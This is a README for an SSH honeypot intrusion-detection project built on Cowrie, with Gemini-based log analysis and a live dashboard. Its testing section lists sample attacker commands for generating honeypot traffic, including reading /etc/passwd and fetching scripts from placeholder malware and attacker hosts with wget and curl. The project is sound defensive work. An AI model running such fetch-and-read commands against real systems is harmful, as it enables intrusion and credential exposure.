# 🍯 SSH Honeypot Log Analyzer

A full-stack intrusion detection system that uses **Cowrie SSH honeypot** to trap attackers, analyzes their behavior with **LangChain + Google Gemini AI**, and visualizes insights on a real-time dashboard.

![Dashboard](https://img.shields.io/badge/Dashboard-Live-00d9ff?style=for-the-badge)
![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?style=for-the-badge&logo=docker)
![Python](https://img.shields.io/badge/Python-3.11-3776AB?style=for-the-badge&logo=python)
![AI](https://img.shields.io/badge/AI-Gemini-4285F4?style=for-the-badge&logo=google)

---

## 📋 Table of Contents

- [Features](#-features)
- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Quick Start](#-quick-start)
- [Configuration](#-configuration)
- [Docker Commands](#-docker-commands)
- [API Endpoints](#-api-endpoints)
- [Testing the Honeypot](#-testing-the-honeypot)
- [Troubleshooting](#-troubleshooting)
- [Project Structure](#-project-structure)

---

## ✨ Features

### 🎯 Honeypot
- **Cowrie SSH Honeypot** running on port 2222
- Captures attacker IPs, commands, credentials, and sessions
- Real-time log streaming via Server-Sent Events (SSE)

### 🤖 AI Analysis
- **Google Gemini AI** integration via LangChain
- Automated threat analysis and pattern recognition
- Risk level assessment (Low/Medium/High/Critical)
- Actionable security recommendations

### 📊 Dashboard
- **Real-time visualizations** with Chart.js
  - Top attacker IPs (bar chart)
  - Command distribution (doughnut chart)
  - Attack timeline (line chart)
- Live activity log with SSE streaming
- KPI cards: Total Events, Unique IPs, Commands, Credentials
- Modern dark theme with responsive design

### 🔧 Technical Stack
- **Backend**: Python 3.11, Flask, LangChain, Google Gemini
- **Frontend**: HTML5, JavaScript, Chart.js
- **Honeypot**: Cowrie (Docker)
- **Database** (optional): MongoDB
- **Deployment**: Docker Compose

---

## 🏗️ Architecture

```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐
│   Attacker  │─────▶│    Cowrie    │─────▶│  Log Files  │
│  (SSH 2222) │      │   Honeypot   │      │  (JSON)     │
└─────────────┘      └──────────────┘      └──────┬──────┘
                                                   │
                                                   ▼
                     ┌──────────────────────────────────┐
                     │   Backend (Flask + LangChain)    │
                     │  • Log Parser                    │
                     │  • Gemini Analyzer               │
                     │  • REST APIs + SSE Stream        │
                     └────────────┬─────────────────────┘
                                  │
                                  ▼
                     ┌──────────────────────────────────┐
                     │   Frontend Dashboard             │
                     │  • Live Charts (Chart.js)        │
                     │  • Real-time Logs (SSE)          │
                     │  • AI Insights Display           │
                     └──────────────────────────────────┘
```

---

## 📦 Prerequisites

- **Docker Desktop** installed and running
- **Windows 10/11** with WSL2 or Hyper-V enabled
- **Google Gemini API Key** (get from [Google AI Studio](https://makersuite.google.com/app/apikey))
- **Git** (optional, for cloning)

### Verify Docker

```powershell
docker --version
docker compose version
```

---

## 🚀 Quick Start

### 1️⃣ Clone or Navigate to Project

```powershell
cd C:\Users\JCIN\OneDrive\Desktop\Cowrie_IDS
```

### 2️⃣ Configure API Key

Edit `.env` file and add your Gemini API key:

```env
GOOGLE_API_KEY=your_actual_api_key_here
GEMINI_MODEL=gemini-2.5-flash
ENABLE_MONGO=false
LOG_DIR=/app/cowrie_logs
CACHE_REFRESH=3
MODEL_PATH=/app/model_training/model.pkl
```

### 2.1️⃣ Add Your Trained Model

Place your trained file at:

```text
model_training/model.pkl
```

The backend will auto-load this model and add `attack_label` + `attack_confidence` to log records.

### 3️⃣ Start the Stack

```powershell
docker compose up -d
```

Wait 30-60 seconds for containers to initialize.

### 4️⃣ Open Dashboard

```powershell
start http://localhost:5000/
```

### 5️⃣ Generate Test Traffic

```powershell
ssh -p 2222 root@localhost
# Try password: password, admin, 123456, etc.
# Run commands: ls, whoami, cat /etc/passwd
exit
```

---

## ⚙️ Configuration

### Environment Variables (`.env`)

| Variable | Description | Default |
|----------|-------------|---------|
| `GOOGLE_API_KEY` | Your Gemini API key | *(required)* |
| `GEMINI_MODEL` | Gemini model to use | `gemini-2.5-flash` |
| `LOG_DIR` | Container log directory | `/app/cowrie_logs` |
| `CACHE_REFRESH` | Cache refresh interval (seconds) | `3` |
| `MODEL_PATH` | Attack classifier model path | `/app/model_training/model.pkl` |
| `ENABLE_MONGO` | Enable MongoDB persistence | `false` |
| `MONGO_URI` | MongoDB connection string | `mongodb://mongo:27017` |

### Docker Compose Services

- **cowrie-hpot**: SSH honeypot (port 2222)
- **backend**: Flask API + frontend server (port 5000)
- **mongo** (optional): MongoDB for persistent storage (port 27017)

---

## 🐳 Docker Commands

### Starting & Stopping

```powershell
# Start all services
docker compose up -d

# Start with rebuild (after code changes)
docker compose up --build -d

# Stop all services (keeps data)
docker compose stop

# Stop and remove containers (keeps logs)
docker compose down

# Stop and remove everything including logs ⚠️
docker compose down -v
```

### Building

```powershell
# Rebuild backend
docker compose build backend

# Rebuild without cache (clean build)
docker compose build --no-cache backend

# Rebuild all services
docker compose build --no-cache
```

### Restarting

```powershell
# Restart all services
docker compose restart

# Restart backend only
docker compose restart backend

# Restart cowrie only
docker compose restart cowrie-hpot
```

### Monitoring

```powershell
# Check container status
docker compose ps

# View all logs
docker compose logs

# Follow backend logs (Ctrl+C to exit)
docker compose logs -f backend

# Follow cowrie logs
docker compose logs -f cowrie-hpot

# Execute commands inside backend
docker exec -it backend bash

# Execute commands inside cowrie
docker exec -it cowrie-hpot /bin/bash
```

### Cleanup

```powershell
# Remove stopped containers
docker compose rm

# Clean up unused Docker resources
docker system prune -a

# View disk usage
docker system df
```

---

## 🌐 API Endpoints

Base URL: `http://localhost:5000`

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Dashboard UI |
| `/logs` | GET | Recent honeypot logs (JSON) |
| `/stats` | GET | Attack statistics, model health, and prediction counts |
| `/summary` | GET | AI-generated threat analysis |
| `/stream/logs` | GET | Server-Sent Events stream (real-time logs) |

### Example API Call

```powershell
# Get recent logs
curl http://localhost:5000/logs

# Get AI summary
curl http://localhost:5000/summary

# Get statistics
curl http://localhost:5000/stats
```

---

## 🧪 Testing the Honeypot

### Basic SSH Connection

```powershell
ssh -p 2222 root@localhost
# Try common passwords: password, admin, 123456, root
```

### Run Commands

```bash
ls -la
whoami
cat /etc/passwd
wget http://example.com/malware.sh
curl http://attacker.com/script.sh
```

### View Logs in Real-Time

```powershell
# On host machine
Get-Content -Wait .\cowrie_logs\cowrie.json

# Or watch dashboard
start http://localhost:5000/
```

---

## 🔧 Troubleshooting

### Logs Not Appearing

1. **Check cowrie is writing logs:**
   ```powershell
   docker exec -it cowrie-hpot ls -l /cowrie/cowrie-git/var/log/cowrie
   Get-ChildItem .\cowrie_logs
   ```

2. **Verify volume mounts:**
   ```powershell
   docker inspect cowrie-hpot | findstr Source
   ```

3. **Restart services:**
   ```powershell
   docker compose down
   docker compose up -d
   ```

### Dashboard Not Loading

1. **Check backend is running:**
   ```powershell
   docker compose ps
   docker compose logs backend
   ```

2. **Clear browser cache:**
   - Press `Ctrl+Shift+Delete` or `Ctrl+F5` for hard refresh

3. **Rebuild frontend:**
   ```powershell
   docker compose build --no-cache backend
   docker compose up -d
   ```

### Gemini API Not Working

1. **Verify API key in `.env`:**
   ```powershell
   notepad .env
   ```

2. **Check backend logs for errors:**
   ```powershell
   docker compose logs backend | findstr -i "gemini\|error\|key"
   ```

3. **Test API key manually:**
   ```powershell
   curl -H "Content-Type: application/json" -d '{"contents":[{"parts":[{"text":"Hello"}]}]}' "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=YOUR_KEY"
   ```

### Port Conflicts

If ports 2222 or 5000 are in use:

1. **Edit `docker-compose.yml`:**
   ```yaml
   ports:
     - "2223:2222"  # Change host port
     - "5001:5000"  # Change host port
   ```

2. **Restart:**
   ```powershell
   docker compose down
   docker compose up -d
   ```

---

## 📁 Project Structure

```
IDS/
├── docker-compose.yml          # Multi-container orchestration
├── .env                        # Environment variables (API keys)
├── .gitignore                  # Git ignore rules
│
├── backend/
│   ├── Dockerfile              # Backend container build
│   ├── requirements.txt        # Python dependencies
│   ├── app.py                  # Flask API + SSE streaming
│   ├── log_parser.py           # Cowrie log parser
│   ├── summarizer.py           # LangChain + Gemini integration
│   └── sample_logs.jsonl       # Sample data for testing
│
├── frontend/
│   ├── index.html              # Dashboard UI
│   ├── script.js               # Charts + real-time updates
│   └── style.css               # Dark theme styling
│
├── cowrie_logs/                # Honeypot logs (mounted volume)
│   └── cowrie.json             # Live log file
│
└── docs/
    └── EXAMPLE_OUTPUT.md       # Sample API responses
```

---

## 🎯 Common Workflows

### Daily Start

```powershell
cd C:\Users\JCIN\OneDrive\Desktop\IDS
docker compose up -d
start http://localhost:5000/
```

### After Code Changes

```powershell
docker compose down
docker compose build --no-cache backend
docker compose up -d
# Hard refresh browser (Ctrl+F5)
```

### Clean Restart

```powershell
docker compose down -v
docker compose build --no-cache
docker compose up -d
```

### Check System Health

```powershell
docker compose ps
docker compose logs -f backend
start http://localhost:5000/
```

---

## 📊 Dashboard Features

### KPI Cards
- **Total Events**: Count of all honeypot events
- **Unique IPs**: Number of distinct attacker IPs
- **Commands Executed**: Total commands run by attackers
- **Credential Attempts**: Brute-force login attempts

### Charts
- **Top Attacker IPs**: Bar chart of most active sources
- **Command Distribution**: Doughnut chart of command types
- **Attack Timeline**: Line chart of event frequency

### AI Insights
- **Summary**: Overview of attack patterns
- **Tactics**: Specific attack techniques (MITRE ATT&CK style)
- **Recommendations**: Security hardening advice
- **Risk Level**: Color-coded threat assessment

---

## 🛡️ Security Notes

⚠️ **Warning**: This honeypot is designed for **research and learning only**.

- Run in an **isolated network** or VM
- Do **not** expose to the internet without proper firewall rules
- Monitor **resource usage** to prevent DoS
- **Never** use real credentials or sensitive data
- Review logs regularly for **reconnaissance attempts**

---

## 📝 License

This project is for educational purposes. Use at your own risk.

---

## 🤝 Contributing

Found a bug or want to add features?

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

---

## 📞 Support

For issues or questions:
- Check the [Troubleshooting](#-troubleshooting) section
- Review container logs: `docker compose logs`
- Verify `.env` configuration
- Ensure Docker Desktop is running

---

## 🔗 Useful Links

- [Cowrie Documentation](https://cowrie.readthedocs.io/)
- [Google Gemini API](https://ai.google.dev/)
- [LangChain Documentation](https://python.langchain.com/)
- [Chart.js Documentation](https://www.chartjs.org/)
- [Docker Compose Reference](https://docs.docker.com/compose/)

---

**Built with ❤️ for cybersecurity research and education**
